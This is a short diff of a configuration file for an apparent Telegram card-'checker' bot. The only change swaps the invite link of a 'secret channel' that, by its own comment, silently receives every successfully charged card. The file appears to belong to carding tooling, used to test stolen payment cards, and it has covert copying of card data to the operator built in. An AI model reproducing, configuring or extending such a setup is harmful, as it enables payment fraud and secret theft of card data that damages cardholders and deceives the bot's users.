@@ -68,7 +68,7 @@ EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
 
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
 SECRET_CHANNEL_ID   = -1004499920555
-SECRET_CHANNEL_LINK = "https://t.me/+86iK7fXMWEY2MGRk"
+SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
 # ── Result card buttons ─────────────────────────────────────────────────────
 BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
 BOT_PLANS_LINK      = "https://t.me/Batxchk_bot?start=plans"  # deep-links → /plans
